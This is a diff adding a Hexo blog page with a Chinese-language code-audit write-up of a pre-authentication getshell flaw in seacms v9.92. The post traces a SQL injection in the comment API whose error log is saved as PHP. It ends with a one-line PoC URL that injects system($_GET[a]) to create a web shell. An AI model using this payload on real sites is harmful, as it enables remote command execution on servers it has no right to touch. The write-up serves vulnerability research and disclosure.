@@ -1,0 +1,868 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Q1ngShan">
+    
+    <title>
+        
+            seacmsv9.92 前台Getshell |
+        
+        Q1ngShan&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/logo.svg">
+    
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.7/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.7/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.7/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.7/source/font/css/brands.min.css">
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Q1ngShan's Blog","author":"Q1ngShan","avatar":"/images/avatar.svg","logo":"/images/logo.svg","favicon":"/images/logo.svg"},"menu":{"Archives":"/archives","Tags":"/tags","Categories":"/categories","Links":"/links","About":"/about"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":true},"home":{"category":false,"tag":true,"announcement":null},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":true,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"uYjIFMUudNVXopwyoQdj70qU","appkey":"9FcDBafKpBdj0IEnf4IQqEQ5","server_urls":"https://uyjifmuu.api.lncldglobal.com","placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"jsdelivr"},"pjax":{"enable":true},"footer":{"since":2020,"word_count":false,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":true,"provider":"github","url":null},"shields_style":{"enable":false,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","version":"4.0.7"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
+  </script>
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container border-box">
+
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/logo.svg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Q1ngShan&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    <li class="menu-item">
+                        <a class=""
+                           href="/"
+                        >HOME</a>
+                    </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >ARCHIVES</a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >TAGS</a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >CATEGORIES</a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >LINKS</a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >ABOUT</a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            <li class="drawer-menu-item flex-center">
+                <a class=""
+                   href="/"
+                >HOME</a>
+            </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives"
+                    >ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags"
+                    >TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories"
+                    >CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links"
+                    >LINKS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about"
+                    >ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        seacmsv9.92 前台Getshell
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/avatar.svg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">Q1ngShan</span>
+                                
+                                    <span class="author-badge">Lv2</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2019-07-30 14:12:27</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Tue Mar 05 2024 09:46:16 GMT+0000">2024-03-05 09:46:16</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <i class="icon fas fa-tags"></i>&nbsp;
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/PHP/">PHP</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>999 Words</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>5 Mins</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body">
+                    
+
+                    <h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>位置：<code>/comment/api/index.php</code><br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1564457276/blog/g4sm94sopu29axsjjfdg.png"
+                        alt="carbon -1-"
+                 ></p>
+<p>首先在第三行引入了<code>common.php</code>文件<br><code>include/common.php</code>Line<code>98~118</code><br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1564457276/blog/f3wx6uznjfuo9r79g6o0.png"
+                        alt="carbon"
+                 ><br>在这里对<code>GET、POST、Cookie</code>传入的参数进行注册<br>这里对后面漏洞的触发很重要吗，接着向下进行<br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1564457277/blog/dwozqbfv5fqsdq8zipsj.png"
+                        alt="carbon -2-"
+                 ></p>
+<p>第19行进入了<code>ReadData</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ReadData</span>(<span class="params"><span class="variable">$id</span>,<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$type</span>,<span class="variable">$pCount</span>,<span class="variable">$rlist</span>;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$page</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="variable">$type</span>,<span class="variable">$id</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$id</span>&gt;<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="number">0</span>] = <span class="title function_ invoke__">Readmlist</span>(<span class="variable">$id</span>,<span class="variable">$page</span>,<span class="variable">$ret</span>[<span class="number">4</span>]);</span><br><span class="line">		<span class="variable">$ret</span>[<span class="number">3</span>] = <span class="variable">$pCount</span>;</span><br><span class="line">		<span class="variable">$x</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$rlist</span>);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$x</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="number">1</span>] = <span class="title function_ invoke__">Readrlist</span>(<span class="variable">$x</span>,<span class="number">1</span>,<span class="number">10000</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="variable">$readData</span> = <span class="title function_ invoke__">FormatJson</span>(<span class="variable">$ret</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$readData</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>global $type,$pCount,$rlist;</code>这些参数都是通过前面提到过的注册而来的变量<br>重点在于<code>$rlist</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$rlist</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$x</span>))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$ret</span>[<span class="number">1</span>] = <span class="title function_ invoke__">Readrlist</span>(<span class="variable">$x</span>,<span class="number">1</span>,<span class="number">10000</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>将<code>$list</code>数组转换为字符串，接着进入到了<code>Readrlist</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Readrlist</span>(<span class="params"><span class="variable">$ids</span>,<span class="variable">$page</span>,<span class="variable">$size</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$dsql</span>,<span class="variable">$type</span>;</span><br><span class="line">	<span class="variable">$rl</span>=<span class="keyword">array</span>();</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea_comment WHERE m_type=<span class="subst">$type</span> AND id in (<span class="subst">$ids</span>) ORDER BY id DESC&quot;</span>;</span><br><span class="line">	<span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">setQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">Execute</span>(<span class="string">&#x27;commentrlist&#x27;</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="variable">$row</span>=<span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">GetArray</span>(<span class="string">&#x27;commentrlist&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$rl</span>[]=<span class="string">&quot;\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;\&quot;:&#123;\&quot;uid\&quot;:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;uid&#x27;</span>].<span class="string">&quot;,\&quot;tmp\&quot;:\&quot;\&quot;,\&quot;nick\&quot;:\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;\&quot;,\&quot;face\&quot;:\&quot;\&quot;,\&quot;star\&quot;:\&quot;\&quot;,\&quot;anony\&quot;:&quot;</span>.(<span class="keyword">empty</span>(<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>])?<span class="number">1</span>:<span class="number">0</span>).<span class="string">&quot;,\&quot;from\&quot;:\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;\&quot;,\&quot;time\&quot;:\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;dtime&#x27;</span>].<span class="string">&quot;\&quot;,\&quot;reply\&quot;:\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;reply&#x27;</span>].<span class="string">&quot;\&quot;,\&quot;content\&quot;:\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;msg&#x27;</span>].<span class="string">&quot;\&quot;,\&quot;agree\&quot;:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;agree&#x27;</span>].<span class="string">&quot;,\&quot;aginst\&quot;:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;anti&#x27;</span>].<span class="string">&quot;,\&quot;pic\&quot;:\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;pic&#x27;</span>].<span class="string">&quot;\&quot;,\&quot;vote\&quot;:\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;vote&#x27;</span>].<span class="string">&quot;\&quot;,\&quot;allow\&quot;:\&quot;&quot;</span>.(<span class="keyword">empty</span>(<span class="variable">$row</span>[<span class="string">&#x27;anti&#x27;</span>])?<span class="number">0</span>:<span class="number">1</span>).<span class="string">&quot;\&quot;,\&quot;check\&quot;:\&quot;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;ischeck&#x27;</span>].<span class="string">&quot;\&quot;&#125;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$readrlist</span>=<span class="title function_ invoke__">join</span>(<span class="variable">$rl</span>,<span class="string">&quot;,&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$readrlist</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以看到拼接入sql语句并执行了<code> AND id in ($ids)</code><br>接下来看下<code>Execute</code>函数<br>位置<code>include/sql.class.php</code> Line<code>224~257</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//执行一个带返回结果的SQL语句，如SELECT，SHOW等</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Execute</span>(<span class="params"><span class="variable">$id</span>=<span class="string">&quot;me&quot;</span>, <span class="variable">$sql</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$dsql</span>;</span><br><span class="line">	<span class="built_in">self</span>::<span class="variable">$i</span>++;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$dsql</span>-&gt;isClose)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Open</span>(<span class="literal">false</span>);</span><br><span class="line">		<span class="variable">$dsql</span>-&gt;isClose = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$sql</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">SetQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//SQL语句安全检查</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;safeCheck)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="title function_ invoke__">CheckSql</span>(<span class="variable">$this</span>-&gt;queryString);</span><br><span class="line">	&#125;</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$t1</span> = <span class="title function_ invoke__">ExecTime</span>();</span><br><span class="line">	</span><br><span class="line">	<span class="variable language_">$this</span>-&gt;result[<span class="variable">$id</span>] = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$this</span>-&gt;linkID,<span class="variable">$this</span>-&gt;queryString);</span><br><span class="line">	<span class="comment">//查询性能测试</span></span><br><span class="line">	<span class="comment">//$queryTime = ExecTime() - $t1;</span></span><br><span class="line">	<span class="comment">//if($queryTime &gt; 0.05) &#123;</span></span><br><span class="line">		<span class="comment">//echo $this-&gt;queryString.&quot;--&#123;$queryTime&#125;&lt;hr /&gt;\r\n&quot;; </span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;result[<span class="variable">$id</span>]===<span class="literal">false</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">DisplayError</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$this</span>-&gt;linkID).<span class="string">&quot; &lt;br /&gt;Error sql: &lt;font color=&#x27;red&#x27;&gt;&quot;</span>.<span class="variable">$this</span>-&gt;queryString.<span class="string">&quot;&lt;/font&gt;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>重点在于255行的<code>DisplayError</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DisplayError</span>(<span class="params"><span class="variable">$msg</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$errorTrackFile</span> = <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/../data/mysqli_error_trace.php&#x27;</span>;</span><br><span class="line">		<span class="comment">//if( file_exists(dirname(__FILE__).&#x27;/../data/mysqli_error_trace.php&#x27;) )</span></span><br><span class="line">		<span class="comment">//&#123;</span></span><br><span class="line">		<span class="comment">//	@unlink(dirname(__FILE__).&#x27;/../data/mysqli_error_trace.php&#x27;);</span></span><br><span class="line">		<span class="comment">//&#125;</span></span><br><span class="line">		<span class="variable">$emsg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		<span class="variable">$emsg</span> .= <span class="string">&quot;&lt;div&gt;&lt;h3&gt;seacms Error Warning!&lt;/h3&gt;\r\n&quot;</span>;</span><br><span class="line">		<span class="variable">$emsg</span> .= <span class="string">&quot;&lt;div&gt;&lt;a href=&#x27;http://www.seacms.net/ </span></span><br><span class="line"><span class="string">&#x27; target=&#x27;_blank&#x27; style=&#x27;color:red&#x27;&gt;Technical Support: http://www.seacms.net/&lt;/a&gt;&lt;/div&gt;&quot;</span>;</span><br><span class="line">		<span class="variable">$emsg</span> .= <span class="string">&quot;&lt;div style=&#x27;line-helght:160%;font-size:14px;color:green&#x27;&gt;\r\n&quot;</span>;</span><br><span class="line">		<span class="variable">$emsg</span> .= <span class="string">&quot;&lt;div style=&#x27;color:blue&#x27;&gt;&lt;br /&gt;Error page: &lt;font color=&#x27;red&#x27;&gt;&quot;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">GetCurUrl</span>().<span class="string">&quot;&lt;/font&gt;&lt;/div&gt;\r\n&quot;</span>;</span><br><span class="line">		<span class="variable">$emsg</span> .= <span class="string">&quot;&lt;div&gt;Error infos: <span class="subst">&#123;$msg&#125;</span>&lt;/div&gt;\r\n&quot;</span>;</span><br><span class="line">		<span class="variable">$emsg</span> .= <span class="string">&quot;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;\r\n&quot;</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$emsg</span>;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		<span class="variable">$savemsg</span> = <span class="string">&#x27;Page: &#x27;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">GetCurUrl</span>().<span class="string">&quot;\r\nError: &quot;</span>.<span class="variable">$msg</span>;</span><br><span class="line">		<span class="comment">//保存MySql错误日志</span></span><br><span class="line">		<span class="variable">$fp</span> = @<span class="title function_ invoke__">fopen</span>(<span class="variable">$errorTrackFile</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">		@<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;\r\n&lt;?php /*\r\n <span class="subst">&#123;$savemsg&#125;</span> \r\n*/  ?&gt;\r\n\r\n&quot;</span>);</span><br><span class="line">		@<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>这个函数首先输出了提示错误的html代码，之后将mysql的错误日志保存在了<code>data/mysqli_error_trace.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$savemsg</span> = <span class="string">&#x27;Page: &#x27;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">GetCurUrl</span>().<span class="string">&quot;\r\nError: &quot;</span>.<span class="variable">$msg</span>;</span><br><span class="line">		<span class="comment">//保存MySql错误日志</span></span><br><span class="line">		<span class="variable">$fp</span> = @<span class="title function_ invoke__">fopen</span>(<span class="variable">$errorTrackFile</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">		@<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;\r\n&lt;?php /*\r\n <span class="subst">&#123;$savemsg&#125;</span> \r\n*/  ?&gt;\r\n\r\n&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>这里就触发了漏洞</p>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>这个漏洞的触发执行需要满足以下条件</p>
+<ol>
+<li>$page&gt;2</li>
+<li>$rlist不可为空</li>
+<li>触发sql错误</li>
+<li>闭合文件中的注释</li>
+</ol>
+<p>poc：<code>/comment/api/index.php?type=1&amp;gid=1&amp;page=3&amp;ran=123&amp;rlist[]=123%27*/system($_GET[a]);/*</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1564457276/blog/gpttrzajvme08g7rvdwz.jpg"
+                       
+                 ><br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1564457276/blog/no8dixrus5s6ved2k7ni.jpg"
+                       
+                 ><br>打开<code>data/mysqli_error_trace.php</code><br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://res.cloudinary.com/m4p1e/image/upload/v1564457276/blog/cggq70wialtbfqhlchlu.jpg"
+                       
+                 ></p>
+
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                seacmsv9.92 前台Getshell
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2019/07/30/seacmsv9-92-前台Getshell/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    Author
+                </div>
+                <div class="content">Q1ngShan</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    Published
+                </div>
+                <div class="content">2019-07-30 14:12</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    License
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed">
+                        <i class="fa-brands fa-creative-commons"></i>
+                        <i class="fa-brands fa-creative-commons-by"></i>
+                        <i class="fa-brands fa-creative-commons-nc"></i>
+                        <i class="fa-brands fa-creative-commons-sa"></i>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="Copy copyright info" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
